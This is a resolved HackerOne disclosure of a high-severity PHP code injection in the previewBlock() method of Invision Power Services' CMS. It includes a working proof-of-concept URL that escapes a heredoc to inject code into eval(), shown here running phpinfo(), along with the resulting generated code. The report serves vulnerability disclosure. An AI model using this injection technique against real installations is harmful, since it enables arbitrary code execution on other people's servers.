---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
  - stack/php
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2021-05-28
submitted: 2021-02-02T00:04:38.493Z
bounty_usd: null
votes: 26
cve: []
program: "[[programs/ips|Invision Power Services, Inc.]]"
reporter: "egix"
source: "https://hackerone.com/reports/1092574"
title: "PHP Code Injection through 'previewBlock()' method"
---
# PHP Code Injection through "previewBlock()" method

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 26 | **Program:** Invision Power Services, Inc. | **Disclosed:** 2021-05-28

- Report: [https://hackerone.com/reports/1092574](https://hackerone.com/reports/1092574)
- CWE: Code Injection
- Submitted: 2021-02-02T00:04:38.493Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
The vulnerability exists because the `IPS\cms\modules\front\pages\_builder::previewBlock()` method allows to pass arbitrary content to the `IPS\_Theme::runProcessFunction()` method, which will be used in a call to the `eval()` function. This can be exploited to inject and execute arbitrary PHP code.

**Steps To Reproduce:**

- Login as an user with permission to manage the sidebar 
- Browse to the following URL:

```
http://[host]/[ips]/index.php?app=cms&module=pages&controller=builder&do=previewBlock&block_plugin=stats&block_template_use_how=copy&block_plugin_app=core&_sending=block_content&block_content=RCE%0ACONTENT;}}phpinfo();die;/*
```

- This will result in the following PHP code to be passed to the `eval()` function from the `IPS\_Theme::runProcessFunction()` method:

```
namespace IPS\Theme;
class class_content_template_for_block_
{
	function run(  ) {
		$return = '';
		$return .= <<<CONTENT

RCE
CONTENT;}}phpinfo();die;/*
CONTENT;

		return $return;
}}
```

- As a result, the `phpinfo()` function will be executed

## Impact

A malicious user might be able to inject and execute arbitrary PHP code. Successful exploitation of this vulnerability requires an account with permission to manage the sidebar (such as a Moderator or Administrator) and the "cms" application to be enabled.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2021-04-02** @egix: Hi @markwade, any update on this?
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
